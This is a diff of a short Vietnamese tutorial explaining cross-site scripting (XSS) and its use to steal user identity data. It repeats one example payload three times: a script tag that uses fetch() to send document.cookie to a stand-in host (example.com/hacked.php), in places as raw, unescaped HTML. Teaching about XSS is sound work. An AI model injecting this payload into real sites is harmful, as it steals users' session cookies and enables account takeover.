@@ -8,6 +8,7 @@
 Thông thường, các cuộc tấn công XSS được sử dụng để vượt qua truy cập và mạo danh người dùng.
 
 Mục đích chính của cuộc tấn công này là ăn cắp dữ liệu nhận dạng của người dùng như:
+
 ```<script>fetch(`http://example.com/hacked.php?xss=${document.cookie}`)</script>```
 
 cookies
@@ -37,4 +38,4 @@ Tấn công XSS là gửi và chèn script độc hại, những mã độc này
 a. Nguyên nhân
 [<script>fetch(`http://example.com/hacked.php?xss=${document.cookie}`)</script>]
 
-<script>fetch(`http://example.com/hacked.php?xss=${document.cookie}`)</script>
+./ <script>fetch(`http://example.com/hacked.php?xss=${document.cookie}`)</script> ./
